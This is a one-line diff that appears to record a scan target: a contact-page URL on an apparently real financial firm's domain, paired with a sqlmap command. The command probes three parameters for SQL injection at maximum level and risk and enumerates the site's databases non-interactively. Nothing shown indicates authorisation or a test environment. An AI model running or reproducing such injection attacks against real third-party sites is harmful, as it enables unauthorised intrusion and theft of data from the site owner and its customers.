@@ -1,0 +1,1 @@
+https://www.infinitycapital.bh/contact?cb=1&q=test&x=1 (GET)  # /usr/bin/sqlmap -u https://www.infinitycapital.bh/contact?cb=1&q=test&x=1 -p cb,q,x --batch --level=5 --risk=3 --dbs --threads=2 --timeout=15 --retries=1 --output-dir=tool_outputs/sqc
